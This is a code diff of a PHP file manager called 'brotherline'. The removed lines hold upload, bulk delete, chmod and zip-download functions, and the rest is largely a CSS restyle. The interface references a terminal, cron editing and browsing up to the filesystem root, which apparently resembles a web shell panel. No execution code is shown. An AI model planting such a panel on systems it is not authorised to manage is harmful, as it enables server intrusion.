-    for ($i = 0; $i < $file_count; $i++) {
-        $name = is_array($files['name']) ? $files['name'][$i] : $files['name'];
-        $tmp_name = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
-        $error = is_array($files['error']) ? $files['error'][$i] : $files['error'];
-
-        if ($error !== UPLOAD_ERR_OK) {
-            $errors[] = "$name (Error code: $error)";
-            continue;
-        }
-        $file_name = basename($name);
-        if (preg_match('/[\\/\:\*\?"<>\|]/', $file_name)) {
-            $errors[] = "$file_name (Invalid characters in name)";
-            continue;
-        }
-        $destination = $path . DIRECTORY_SEPARATOR . $file_name;
-        if (file_exists($destination)) {
-            $errors[] = "$file_name (File already exists)";
-            continue;
-        }
-        if (move_uploaded_file($tmp_name, $destination)) {
-            $success_count++;
-        } else {
-            $errors[] = "$file_name (Failed to move, check folder permissions)";
-        }
-    }
-
-    if ($success_count > 0 && empty($errors)) {
-        send_success(['message' => "$success_count file(s) uploaded successfully."]);
-    } elseif ($success_count > 0) {
-        send_error("Uploaded $success_count file(s), but failed for: " . implode(', ', $errors));
-    } else {
-        send_error('Upload failed. Errors: ' . implode(', ', $errors));
-    }
-}
-
-function bulk_delete($path, $items)
-{
-    if (empty($items)) send_error('No items selected.');
-    $errors = [];
-    foreach ($items as $item_name) {
-        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
-        if (file_exists($item_path)) {
-            delete_item_recursive($item_path);
-        } else {
-            $errors[] = $item_name;
-        }
-    }
-    if (empty($errors)) send_success(['message' => count($items) . ' items deleted.']);
-    else send_error('Could not delete: ' . implode(', ', $errors));
-}
-
-function bulk_chmod($path, $items, $perms)
-{
-    if (empty($items)) send_error('No items selected.');
-    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format.');
-    $octal_perms = octdec($perms);
-    $errors = [];
-    foreach ($items as $item_name) {
-        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
-        if (file_exists($item_path) && !@chmod($item_path, $octal_perms)) {
-            $errors[] = $item_name;
-        }
-    }
-    if (empty($errors)) send_success(['message' => 'Permissions changed for ' . count($items) . ' items.']);
-    else send_error('Could not change permissions for: ' . implode(', ', $errors));
-}
-
-function bulk_download($path, $items)
-{
-    if (!class_exists('ZipArchive')) send_error('ZipArchive class is not available.');
-    if (empty($items)) send_error('No items selected for download.');
-
-    $zip = new ZipArchive();
-    $zip_name = 'download_' . time() . '.zip';
-    $zip_path = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zip_name;
-
-    if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
-        send_error('Cannot create zip archive.');
-    }
-
-    foreach ($items as $item_name) {
-        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
-        if (file_exists($item_path)) {
-            if (is_file($item_path)) {
-                $zip->addFile($item_path, basename($item_name));
-            } elseif (is_dir($item_path)) {
-                $files = new RecursiveIteratorIterator(
-                    new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
-                    RecursiveIteratorIterator::LEAVES_ONLY
-                );
-                foreach ($files as $name => $file) {
-                    if (!$file->isDir()) {
-                        $filePath = $file->getRealPath();
-                        $relativePath = basename($item_name) . '/' . substr($filePath, strlen($item_path) + 1);
-                        $zip->addFile($filePath, $relativePath);
-                    }
-                }
-            }
-        }
-    }
-    $zip->close();
-
-    if (file_exists($zip_path)) {
-        header('Content-Type: application/zip');
-        header('Content-Disposition: attachment; filename="' . $zip_name . '"');
-        header('Content-Length: ' . filesize($zip_path));
-        readfile($zip_path);
-        @unlink($zip_path);
-        exit;
-    } else {
-        send_error('Could not create the zip file.');
-    }
-}
-
-function generate_breadcrumbs($current_path)
-{
-    $breadcrumbs = [];
-    $real_path = realpath($current_path);
-    if ($real_path === false) return [['name' => 'Invalid Path', 'path' => '']];
-
-    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
-
-    $base_path = DOC_ROOT;
-    if (strpos($real_path, $base_path) !== 0) {
-        $base_path = $is_windows ? '' : '/';
-    }
-
-    $relative_path = substr($real_path, strlen($base_path));
-    $parts = explode(DIRECTORY_SEPARATOR, trim($relative_path, DIRECTORY_SEPARATOR));
-
-    $path_builder = $base_path;
-    $breadcrumbs[] = ['name' => '[ ROOT ]', 'path' => DOC_ROOT];
-
-    foreach ($parts as $part) {
-        if (empty($part)) continue;
-        $path_builder .= DIRECTORY_SEPARATOR . $part;
-        $breadcrumbs[] = ['name' => $part, 'path' => $path_builder];
-    }
-    return $breadcrumbs;
-}
-
-function format_size($bytes)
-{
-    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
-    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
-    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
-    return $bytes . ' bytes';
-}
-?>
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>brotherline — File Manager</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
+            darkMode: 'class',
             theme: {
                 extend: {
-                    colors: {
-                        'ex': {
-                            'bg':        '#0a0c0f',
-                            'surface':   '#111318',
-                            'border':    '#1e2229',
-                            'hover':     '#181c23',
-                            'accent':    '#e85d38',
-                            'accent2':   '#f07a5c',
-                            'blue':      '#4a9eff',
-                            'text':      '#d4dae6',
-                            'muted':     '#606878',
-                            'header':    '#0d1016',
-                        }
-                    },
                     fontFamily: {
-                        'sans': ['Geist', 'system-ui', 'sans-serif'],
-                        'mono': ['Geist Mono', 'monospace'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                        display: ['Syne', 'sans-serif'],
                     }
                 }
             }
         }
     </script>
-
     <style>
+        /* ── DARK THEME (default) ── */
+        :root {
+            --c-base:    #0d0d0f;
+            --c-surface: #141416;
+            --c-panel:   #1a1a1d;
+            --c-border:  #2a2a2e;
+            --c-muted:   #3a3a3f;
+            --c-dim:     #6b6b75;
+            --c-text:    #e2e2e8;
+            --c-accent:  #f59e0b;
+            --c-green:   #22c55e;
+            --c-red:     #ef4444;
+            --c-blue:    #3b82f6;
+            --c-purple:  #a855f7;
+            --c-row-hover: #1e1e22;
+            --c-scrollbar-track: #0d0d0f;
+            --c-scrollbar-thumb: #3a3a3f;
+        }
+
+        /* ── LIGHT THEME ── */
+        html.light {
+            --c-base:    #f4f4f5;
+            --c-surface: #ffffff;
+            --c-panel:   #f0f0f2;
+            --c-border:  #d4d4d8;
+            --c-muted:   #a1a1aa;
+            --c-dim:     #71717a;
+            --c-text:    #18181b;
+            --c-accent:  #d97706;
+            --c-green:   #16a34a;
+            --c-red:     #dc2626;
+            --c-blue:    #2563eb;
+            --c-purple:  #9333ea;
+            --c-row-hover: #e8e8ec;
+            --c-scrollbar-track: #f4f4f5;
+            --c-scrollbar-thumb: #d4d4d8;
+        }
+
         * { box-sizing: border-box; }
-
         body {
-            background-color: #0a0c0f;
-            color: #d4dae6;
-            font-family: 'Geist', system-ui, sans-serif;
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--c-base);
+            color: var(--c-text);
+            transition: background 0.2s, color 0.2s;
         }
 
-        /* Custom scrollbar */
-        ::-webkit-scrollbar { width: 5px; height: 5px; }
-        ::-webkit-scrollbar-track { background: #0a0c0f; }
-        ::-webkit-scrollbar-thumb { background: #1e2229; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #2a3040; }
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--c-scrollbar-track); }
+        ::-webkit-scrollbar-thumb { background: var(--c-scrollbar-thumb); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--c-dim); }
 
-        /* Titlebar chrome effect */
-        .titlebar {
-            background: linear-gradient(180deg, #161a22 0%, #111318 100%);
-            border-bottom: 1px solid #1e2229;
+        /* File upload button */
+        ::-webkit-file-upload-button {
+            background: transparent; color: var(--c-text);
+            border: 1px solid var(--c-muted); padding: 4px 10px; border-radius: 4px;
+            cursor: pointer; font-family: 'JetBrains Mono', monospace; font-size: 12px;
         }
+        ::-webkit-file-upload-button:hover { border-color: var(--c-accent); color: var(--c-accent); }
 
-        /* Toolbar button */
-        .toolbar-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            color: #8a95a8;
-            cursor: pointer;
-            border: 1px solid transparent;
-            transition: all 0.15s ease;
-            background: transparent;
-            white-space: nowrap;
-        }
-        .toolbar-btn:hover {
-            background: #181c23;
-            border-color: #1e2229;
-            color: #d4dae6;
-        }
-        .toolbar-btn.primary {
-            background: #e85d38;
-            border-color: #e85d38;
-            color: #fff;
-        }
-        .toolbar-btn.primary:hover {
-            background: #f07a5c;
-            border-color: #f07a5c;
-        }
-        .toolbar-btn i { font-size: 11px; }
+        /* Theme-aware utility classes */
+        .t-base    { background: var(--c-base) !important; }
+        .t-surface { background: var(--c-surface) !important; }
+        .t-panel   { background: var(--c-panel) !important; }
+        .t-border  { border-color: var(--c-border) !important; }
+        .t-text    { color: var(--c-text) !important; }
+        .t-dim     { color: var(--c-dim) !important; }
+        .t-accent  { color: var(--c-accent) !important; }
 
-        /* Address bar */
-        .address-bar {
-            background: #0d1016;
-            border: 1px solid #1e2229;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            padding: 0 10px;
-            gap: 8px;
-            height: 32px;
-            flex: 1;
-            min-width: 0;
-        }
-        .address-bar .path-text {
-            font-family: 'Geist Mono', monospace;
-            font-size: 12px;
-            color: #8a95a8;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-        .address-bar .sep { color: #303847; font-size: 14px; }
+        /* Row hover */
+        .file-row:hover { background: var(--c-row-hover) !important; }
+        .file-row:hover td { text-shadow: 0 0 8px rgba(245,158,11,0.2); }
 
-        /* Sidebar */
-        .sidebar {
-            background: #0d1016;
-            border-right: 1px solid #1e2229;
-            width: 200px;
-            flex-shrink: 0;
-            overflow-y: auto;
-        }
+        /* Breadcrumb separator */
+        .breadcrumb-sep { color: var(--c-muted); margin: 0 4px; }
 
-        .sidebar-section-title {
-            font-size: 10px;
-            font-weight: 600;
-            letter-spacing: 0.1em;
-            text-transform: uppercase;
-            color: #404858;
-            padding: 12px 14px 6px;
-        }
+        /* Perm colors */
+        .perm-write  { color: var(--c-green); }
+        .perm-noread { color: var(--c-red); }
+        .perm-normal { color: var(--c-dim); }
 
-        .sidebar-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 5px 14px;
-            font-size: 12px;
-            color: #606878;
-            cursor: pointer;
-            border-radius: 0;
-            transition: all 0.12s;
-            border-left: 2px solid transparent;
-        }
-        .sidebar-item:hover { background: #111318; color: #d4dae6; border-left-color: #1e2229; }
-        .sidebar-item.active { background: #131820; color: #4a9eff; border-left-color: #4a9eff; }
-        .sidebar-item i { width: 14px; text-align: center; font-size: 11px; }
+        /* Badges */
+        .badge-on  { color: var(--c-green); }
+        .badge-off { color: var(--c-red); }
 
-        /* File table */
-        .file-table {
+        /* Icon buttons */
+        .icon-btn {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 28px; height: 28px; border-radius: 6px;
+            border: 1px solid var(--c-border); background: transparent;
+            color: var(--c-dim); cursor: pointer; transition: all 0.15s;
+        }
+        .icon-btn:hover         { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.08); }
+        .icon-btn.danger:hover  { border-color: var(--c-red);    color: var(--c-red);    background: rgba(239,68,68,0.08); }
+        .icon-btn.safe:hover    { border-color: var(--c-green);  color: var(--c-green);  background: rgba(34,197,94,0.08); }
+
+        /* Nav links */
+        .nav-link {
+            padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 600;
+            border: 1px solid var(--c-border); color: var(--c-dim); background: transparent;
+            text-decoration: none; transition: all 0.15s; letter-spacing: 0.05em;
+            text-transform: uppercase; cursor: pointer;
+        }
+        .nav-link:hover  { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.08); }
+        .nav-link.active { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.12); }
+
+        /* Table */
+        #file-table th { font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--c-dim); border-bottom: 1px solid var(--c-border); padding: 10px 12px; font-weight: 500; background: var(--c-surface); }
+        #file-table td { padding: 8px 12px; border-bottom: 1px solid var(--c-border); font-size: 12px; color: var(--c-text); white-space: nowrap; }
+        #file-table td:first-child { width: 35%; }
+        #file-table .filename-cell { display: flex; align-items: center; gap: 8px; }
+        #file-table .filename-cell a { color: var(--c-text); text-decoration: none; transition: color 0.1s; }
+        #file-table .filename-cell a:hover { color: var(--c-accent); }
+        #file-table tr { background: var(--c-base); }
+
+        /* Section divider */
+        .dir-divider td { background: var(--c-surface); color: var(--c-muted); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; padding: 4px 12px; }
+
+        /* Input / Textarea / Select */
+        .field {
+            background: var(--c-base); border: 1px solid var(--c-border); color: var(--c-text);
+            border-radius: 6px; padding: 7px 12px; font-family: 'JetBrains Mono', monospace;
+            font-size: 12px; outline: none; transition: border-color 0.15s, background 0.2s;
             width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
         }
+        .field:focus { border-color: var(--c-accent); }
+        .field::placeholder { color: var(--c-muted); }
+        select.field option { background: var(--c-base); }
 
-        .file-table thead th {
-            background: #0d1016;
-            padding: 8px 12px;
-            text-align: left;
-            font-size: 11px;
-            font-weight: 500;
-            color: #404858;
-            letter-spacing: 0.04em;
+        /* Submit btn */
+        .submit-btn {
+            background: transparent; border: 1px solid var(--c-accent); color: var(--c-accent);
+            border-radius: 6px; padding: 7px 16px; font-family: 'JetBrains Mono', monospace;
+            font-size: 12px; cursor: pointer; transition: all 0.15s; font-weight: 600;
+        }
+        .submit-btn:hover { background: rgba(245,158,11,0.12); }
+
+        /* Alert */
+        .alert { padding: 10px 16px; border-radius: 8px; font-size: 13px; margin-bottom: 12px; }
+        .alert-success { background: rgba(34,197,94,0.1);  border: 1px solid rgba(34,197,94,0.3);  color: var(--c-green); }
+        .alert-error   { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.3);  color: var(--c-red); }
+        .alert-warn    { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); color: var(--c-accent); }
+
+        /* Panel cards */
+        .card { background: var(--c-surface); border: 1px solid var(--c-border); border-radius: 10px; padding: 20px; }
+
+        /* Sidebar panels */
+        .sidebar-panel { background: var(--c-surface); border-bottom: 1px solid var(--c-border); }
+
+        /* Icon colors */
+        .ico-folder { color: var(--c-accent); }
+        .ico-file   { color: var(--c-dim); }
+        .ico-zip    { color: var(--c-purple); }
+        .ico-image  { color: var(--c-blue); }
+        .ico-text   { color: var(--c-green); }
+        .ico-pdf    { color: var(--c-red); }
+        .ico-code   { color: var(--c-accent); }
+        .ico-back   { color: var(--c-dim); }
+
+        /* Accent line */
+        .accent-line { height: 2px; background: linear-gradient(90deg, var(--c-accent), transparent); border-radius: 1px; }
+
+        /* Theme toggle button */
+        .theme-toggle {
+            display: flex; align-items: center; gap: 6px;
+            padding: 5px 12px; border-radius: 20px; cursor: pointer;
+            border: 1px solid var(--c-border); background: var(--c-panel);
+            color: var(--c-dim); font-size: 11px; font-family: 'JetBrains Mono', monospace;
+            transition: all 0.2s; font-weight: 600; letter-spacing: 0.05em;
+            text-transform: uppercase; flex-shrink: 0;
+        }
+        .theme-toggle:hover { border-color: var(--c-accent); color: var(--c-accent); }
+
+        /* Terminal textarea */
+        #term-output {
+            background: var(--c-base); border: 1px solid var(--c-border);
+            color: var(--c-text); border-radius: 8px; padding: 12px;
+            font-family: 'JetBrains Mono', monospace; font-size: 12px;
+            resize: vertical; min-height: 160px; width: 100%; outline: none;
+            transition: border-color 0.15s, background 0.2s;
+            line-height: 1.6;
+        }
+        #term-output:focus { border-color: var(--c-accent); }
+
+        /* Brotherline branding */
+        .brotherline-brand {
+            font-family: 'Syne', sans-serif;
+            font-weight: 800;
+            letter-spacing: 0.12em;
             text-transform: uppercase;
-            border-bottom: 1px solid #1e2229;
-            position: sticky;
-            top: 0;
-            z-index: 5;
-            white-space: nowrap;
-            user-select: none;
-        }
-        .file-table thead th:hover { color: #606878; cursor: pointer; }
-
-        .file-table tbody tr {
-            border-bottom: 1px solid #0f1318;
-            transition: background 0.1s;
-        }
-        .file-table tbody tr:hover { background: #111318; }
-        .file-table tbody tr.selected { background: #111e2c !important; }
-        .file-table tbody tr.ctx-active { background: #141a24 !important; }
-
-        .file-table td {
-            padding: 7px 12px;
-            vertical-align: middle;
-            white-space: nowrap;
+            background: linear-gradient(90deg, var(--c-accent), #fb923c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
-        .file-icon { font-size: 14px; width: 18px; text-align: center; }
-        .file-icon.folder { color: #4a9eff; }
-        .file-icon.file { color: #606878; }
+        /* Header / Nav / Breadcrumb themed backgrounds */
+        header, nav, .breadcrumb-bar {
+            background: var(--c-surface);
+            border-color: var(--c-border);
+            transition: background 0.2s;
+        }
+        aside {
+            background: var(--c-surface);
+            border-color: var(--c-border);
+            transition: background 0.2s;
+        }
+        main {
+            background: var(--c-base);
+            transition: background 0.2s;
+        }
+        .service-badge-on  { background: rgba(34,197,94,0.1);  border: 1px solid rgba(34,197,94,0.3);  color: var(--c-green); }
+        .service-badge-off { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.3);  color: var(--c-red); }
 
-        .file-name-link {
-            color: #c8d0e0;
-            text-decoration: none;
-            font-weight: 400;
-            transition: color 0.1s;
-        }
-        .file-name-link:hover { color: #e85d38; }
-        .file-name-link.folder-type { color: #d4dae6; }
-        .file-name-link.folder-type:hover { color: #4a9eff; }
+        .info-pill { background: var(--c-panel); border: 1px solid var(--c-border); }
 
-        /* Row action buttons */
-        .row-actions {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            gap: 2px;
-            opacity: 0;
-            transition: opacity 0.1s;
-        }
-        tr:hover .row-actions { opacity: 1; }
-
-        .row-act-btn {
-            background: none;
-            border: 1px solid transparent;
-            color: #404858;
-            padding: 3px 6px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 11px;
-            transition: all 0.12s;
-            line-height: 1;
-        }
-        .row-act-btn:hover { background: #1a1f27; border-color: #252d38; color: #d4dae6; }
-        .row-act-btn.delete-btn:hover { background: #2a1414; border-color: #3d1a1a; color: #e85d38; }
-
-        /* Dropdown */
-        .action-menu {
-            position: absolute;
-            background: #131820;
-            border: 1px solid #1e2229;
-            border-radius: 7px;
-            min-width: 180px;
-            z-index: 3000;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            overflow: hidden;
-            padding: 4px;
-        }
-        .action-menu-item {
-            display: flex;
-            align-items: center;
-            gap: 9px;
-            padding: 7px 11px;
-            font-size: 12.5px;
-            color: #8a95a8;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.1s;
-            text-decoration: none;
-        }
-        .action-menu-item:hover { background: #1a2030; color: #d4dae6; }
-        .action-menu-item.danger:hover { background: #2a1414; color: #e85d38; }
-        .action-menu-item i { width: 14px; font-size: 11px; text-align: center; }
-        .action-menu-divider { height: 1px; background: #1e2229; margin: 4px 0; }
-
-        /* Status bar */
-        .status-bar {
-            background: #0d1016;
-            border-top: 1px solid #1e2229;
-            padding: 4px 14px;
-            font-size: 11px;
-            color: #404858;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-shrink: 0;
-        }
-        .status-bar span { display: flex; align-items: center; gap: 5px; }
-
-        /* Bulk actions bar */
-        .bulk-bar {
-            background: #0f1620;
-            border: 1px solid #1a2535;
-            border-radius: 6px;
-            padding: 6px 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 12px;
-            color: #8a95a8;
-        }
-
-        /* Badge */
-        .badge {
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 500;
-        }
-
-        /* Terminal panel */
-        #terminal { width: 100%; height: 100%; }
-
-        /* Tools panel */
-        .tool-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 5px 10px;
-            border: 1px solid #1e2229;
-            background: #0d1016;
-            color: #606878;
-            border-radius: 5px;
-            font-size: 11px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.15s;
-            text-decoration: none;
-        }
-        .tool-btn:hover { border-color: #e85d38; color: #e85d38; background: #150e0c; }
-
-        /* Stats badges */
-        .stat-chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            padding: 3px 9px;
-            border: 1px solid #1e2229;
-            background: #0d1016;
-            border-radius: 5px;
-            font-size: 11px;
-            font-family: 'Geist Mono', monospace;
-            color: #606878;
-        }
-
-        /* Progress */
-        .disk-track {
-            height: 4px;
-            background: #1e2229;
-            border-radius: 2px;
-            width: 80px;
-            overflow: hidden;
-        }
-        .disk-fill {
-            height: 100%;
-            border-radius: 2px;
-            background: #e85d38;
-            transition: width 0.5s;
-        }
-
-        /* Modal */
-        .modal-backdrop {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.7);
-            z-index: 4000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            display: none;
-        }
-        .modal-backdrop.open { display: flex; }
-        .modal-box {
-            background: #111318;
-            border: 1px solid #1e2229;
-            border-radius: 10px;
-            width: 420px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-            overflow: hidden;
-        }
-        .modal-header {
-            padding: 16px 20px;
-            border-bottom: 1px solid #1a1f27;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-size: 14px;
-            font-weight: 500;
-            color: #d4dae6;
-        }
-        .modal-close {
-            background: none;
-            border: none;
-            color: #404858;
-            font-size: 16px;
-            cursor: pointer;
-            padding: 0 4px;
-            transition: color 0.1s;
-        }
-        .modal-close:hover { color: #d4dae6; }
-        .modal-body { padding: 20px; }
-        .modal-footer {
-            padding: 12px 20px;
-            border-top: 1px solid #1a1f27;
-            display: flex;
-            justify-content: flex-end;
-            gap: 8px;
-        }
-
-        .input-field {
-            width: 100%;
-            background: #0d1016;
-            border: 1px solid #1e2229;
-            border-radius: 6px;
-            padding: 8px 12px;
-            font-size: 13px;
-            color: #d4dae6;
-            font-family: 'Geist', sans-serif;
-            outline: none;
+        /* Radio card */
+        .radio-card {
+            display: flex; align-items: center; gap: 8px; cursor: pointer;
+            background: var(--c-base); border: 1px solid var(--c-border);
+            border-radius: 8px; padding: 10px 12px;
             transition: border-color 0.15s;
         }
-        .input-field:focus { border-color: #e85d38; }
-        .input-label { font-size: 12px; color: #606878; margin-bottom: 6px; display: block; }
+        .radio-card:hover { border-color: rgba(245,158,11,0.4); }
 
-        /* SweetAlert2 overrides */
-        .swal2-popup {
-            background: #111318 !important;
-            border: 1px solid #1e2229 !important;
-            color: #d4dae6 !important;
-            font-family: 'Geist', sans-serif !important;
-            border-radius: 10px !important;
+        /* Terminal input bar */
+        .term-input-bar {
+            display: flex; align-items: center;
+            background: var(--c-base); border: 1px solid var(--c-border);
+            border-radius: 8px; padding: 0 12px; gap: 8px;
+            transition: border-color 0.15s, background 0.2s;
         }
-        .swal2-title { color: #d4dae6 !important; font-size: 16px !important; font-weight: 500 !important; }
-        .swal2-html-container { color: #8a95a8 !important; font-size: 13px !important; }
-        .swal2-confirm { background: #e85d38 !important; color: #fff !important; border-radius: 6px !important; font-size: 13px !important; box-shadow: none !important; font-family: 'Geist', sans-serif !important; }
-        .swal2-cancel { background: #1a1f27 !important; color: #8a95a8 !important; border-radius: 6px !important; font-size: 13px !important; box-shadow: none !important; font-family: 'Geist', sans-serif !important; }
-        .swal2-input { background: #0d1016 !important; border: 1px solid #1e2229 !important; color: #d4dae6 !important; font-family: 'Geist Mono', monospace !important; font-size: 13px !important; border-radius: 6px !important; }
-        .swal2-loader { border-color: #e85d38 transparent #e85d38 transparent !important; }
-
-        /* Context menu */
-        #contextMenu { display: none; position: fixed; z-index: 5000; }
-
-        /* Breadcrumb */
-        .breadcrumb-nav { display: flex; align-items: center; gap: 4px; overflow: hidden; }
-        .bc-item {
-            font-size: 12px;
-            color: #606878;
-            font-family: 'Geist Mono', monospace;
-            cursor: pointer;
-            padding: 2px 5px;
-            border-radius: 3px;
-            transition: all 0.1s;
-            white-space: nowrap;
-        }
-        .bc-item:hover { background: #181c23; color: #d4dae6; }
-        .bc-item.current { color: #d4dae6; cursor: default; }
-        .bc-item.current:hover { background: none; }
-        .bc-sep { color: #252d38; font-size: 12px; }
-
-
-
-        /* Panel resizer */
-        .panel-resizer {
-            width: 1px;
-            background: #1e2229;
-            flex-shrink: 0;
-            cursor: col-resize;
-        }
-        .panel-resizer:hover { background: #e85d38; }
-
-        /* Xterm container */
-        .terminal-wrap {
-            flex: 1;
-            min-height: 0;
-            overflow: hidden;
-            padding: 8px;
-            background: #0a0c0f;
-        }
-
-        /* Permission badge */
-        .perm-badge {
-            font-family: 'Geist Mono', monospace;
-            font-size: 11px;
-            color: #404858;
-            padding: 1px 5px;
-            border-radius: 3px;
-            background: #0d1016;
-        }
-
-        /* Checkbox */
-        input[type="checkbox"] {
-            accent-color: #e85d38;
-            width: 13px;
-            height: 13px;
-            cursor: pointer;
-        }
-
-        .tool-output {
-            background: #0a0c0f;
-            border: 1px solid #1e2229;
-            border-radius: 6px;
-            padding: 12px;
-            font-family: 'Geist Mono', monospace;
-            font-size: 12px;
-            max-height: 360px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-        .tool-output dt { color: #e85d38; font-weight: 600; }
-        .tool-output dd { color: #8a95a8; margin-left: 12px; margin-bottom: 8px; }
-
-        /* Editor modal */
-        #editorModal { display: none; }
-        #editorModal.open { display: flex; }
-        .editor-modal-box {
-            background: #111318;
-            border: 1px solid #1e2229;
-            border-radius: 10px;
-            width: 92vw;
-            max-width: 1200px;
-            height: 85vh;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 24px 80px rgba(0,0,0,0.7);
-            overflow: hidden;
-        }
-        #editor { width: 100%; flex: 1; }
-
-        /* Cron modal */
-        #cronModal { display: none; }
-        #cronModal.open { display: flex; }
-        .cron-box { width: 680px; }
-        textarea.input-field { resize: vertical; min-height: 200px; font-family: 'Geist Mono', monospace; font-size: 12px; line-height: 1.6; }
-
-        /* Chmod modal */
-        #chmodModal { display: none; }
-        #chmodModal.open { display: flex; }
-
-        #bulkChmodModal { display: none; }
-        #bulkChmodModal.open { display: flex; }
-
-        #formModal { display: none; }
-        #formModal.open { display: flex; }
-
-        /* Highlight selected row glow */
-        tr.selected td:first-child { border-left: 2px solid #e85d38; }
-
-        /* Window chrome dots */
-        .wc-dot {
-            width: 10px; height: 10px; border-radius: 50%;
-            display: inline-block;
+        .term-input-bar:focus-within { border-color: var(--c-accent); }
+        .term-input-bar input {
+            background: transparent; flex: 1; font-size: 12px;
+            color: var(--c-text); outline: none; font-family: 'JetBrains Mono', monospace;
+            padding: 10px 0;
         }
     </style>
 </head>
-<body class="flex flex-col h-screen overflow-hidden">
 
-    <input type="file" id="fileUploadInput" multiple style="display:none;" />
-
-    <!-- ===== TITLEBAR ===== -->
-    <div class="titlebar flex items-center px-4 h-10 gap-3 flex-shrink-0">
-        <!-- Window chrome -->
-        <div class="flex gap-1.5 items-center mr-2">
-            <span class="wc-dot" style="background:#e85d38;"></span>
-            <span class="wc-dot" style="background:#f0b429;"></span>
-            <span class="wc-dot" style="background:#3db554;"></span>
-        </div>
-
-        <!-- Logo -->
-        <div class="flex items-center gap-2 mr-4">
-            <i class="fas fa-terminal text-ex-accent text-xs"></i>
-            <span class="font-mono text-xs font-semibold text-ex-text tracking-wider">brotherline</span>
-            <span class="text-ex-muted text-xs font-mono">/ file-manager</span>
-        </div>
-
-        <!-- Address bar -->
-        <div class="address-bar flex-1 min-w-0">
-            <i class="fas fa-folder-open text-ex-blue" style="font-size:11px;"></i>
-            <div class="breadcrumb-nav flex-1 min-w-0" id="breadcrumbBar">
-                <span class="bc-item current">Loading...</span>
-            </div>
-        </div>
-
-        <!-- Stats chips -->
-        <div class="flex items-center gap-2 ml-2">
-            <div class="stat-chip" title="Disk Usage">
-                <i class="fas fa-hdd" style="font-size:10px;color:#e85d38;"></i>
-                <div class="disk-track"><div id="disk-fill" class="disk-fill" style="width:0%"></div></div>
-                <span id="disk-label" class="text-ex-muted" style="font-size:10px;">...</span>
-            </div>
-            <div class="stat-chip"><i class="fas fa-user" style="font-size:10px;color:#4a9eff;"></i><span id="stat-user">...</span></div>
